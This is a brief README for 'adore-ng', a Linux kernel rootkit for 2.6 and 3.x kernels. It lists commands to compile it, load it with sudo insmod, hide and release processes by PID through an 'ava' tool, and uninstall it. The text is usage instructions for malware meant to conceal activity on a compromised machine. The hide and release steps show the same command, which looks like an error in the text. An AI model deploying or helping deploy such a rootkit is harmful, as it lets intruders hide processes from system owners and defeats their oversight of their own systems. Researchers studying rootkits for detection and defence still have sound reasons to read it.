adore-ng
========

linux rootkit adapted for 2.6 and 3.x

compile:
	make
install:
	sudo insmod ./adore-ng.ko
Hide process:
	./ava i pid
Release process:
	./ava i pid
uninstall:
	./ava U
